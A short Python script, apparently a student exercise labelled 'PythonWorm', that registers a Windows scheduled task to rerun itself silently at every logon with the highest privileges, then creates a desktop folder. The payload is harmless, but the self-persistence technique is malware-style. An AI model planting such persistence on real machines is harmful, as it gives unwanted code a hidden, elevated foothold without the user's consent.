import os
import subprocess
import sys

def create_startup_task(task_name, script_path):
    pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
    # sys.executable
    command = [
        "schtasks",
        "/create",
        "/sc", "ONLOGON",
        "/tn", task_name,
        "/tr", f'"{pythonw_path}" "{script_path}"',
        "/rl", "highest",
        "/F",
        "/NP"
    ]
    
    try:
        result = subprocess.run(command, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Scheduled task '{task_name}' created successfully.")
        else:
            print(f"Failed to create task. Error: {result.stderr}")
    except Exception as e:
        print(f"An error occurred while creating the task: {e}")

def create_folder_on_desktop():
    try:
        desktop_path = os.path.expanduser("~/Desktop")  # Dynamic desktop path
        folder_path = os.path.join(desktop_path, "SetupFolder")
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
            print(f"Folder created: {folder_path}")
        else:
            print(f"Folder already exists: {folder_path}")
    except Exception as e:
        print(f"An error occurred while creating the folder: {e}")

if __name__ == "__main__":
    task_name = "s142486_PythonWorm"
    script_path = os.path.abspath(__file__)
    create_startup_task(task_name, script_path)
    create_folder_on_desktop()